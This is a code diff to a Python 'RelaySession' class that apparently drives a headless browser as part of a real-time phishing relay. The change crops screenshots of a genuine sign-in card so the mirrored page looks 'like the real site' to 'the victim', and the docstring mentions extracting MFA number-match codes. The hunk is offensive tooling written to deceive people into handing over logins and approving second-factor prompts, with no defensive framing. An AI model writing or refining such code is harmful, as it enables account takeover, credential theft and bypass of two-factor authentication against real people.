@@ -170,9 +170,24 @@ class RelaySession(threading.Thread):
     def _stream(self, pg):
         """Refresh the mirror: screenshot + number-match extraction.
         Called from every poll iteration (~1-2s cadence, single-threaded)."""
+        # crop to the CENTER CARD, not the whole viewport — the sign-in card
+        # is what the victim should see filling the page, like the real site
         try:
-            self.screenshot = base64.b64encode(
-                pg.screenshot(type="jpeg", quality=60)).decode()
+            shot = None
+            for sel in ("#initialView", "div[role='main']", "main"):
+                try:
+                    loc = pg.locator(sel).first
+                    if loc.is_visible():
+                        box = loc.bounding_box()
+                        if box and box["width"] > 250 and box["height"] > 150:
+                            shot = loc.screenshot(type="jpeg", quality=62)
+                            break
+                except Exception:
+                    continue
+            if shot is None:
+                shot = pg.screenshot(type="jpeg", quality=60,
+                                     clip={"x": 171, "y": 64, "width": 1024, "height": 640})
+            self.screenshot = base64.b64encode(shot).decode()
         except Exception as e:
             if not getattr(self, "_shot_err_logged", False):
                 self._shot_err_logged = True
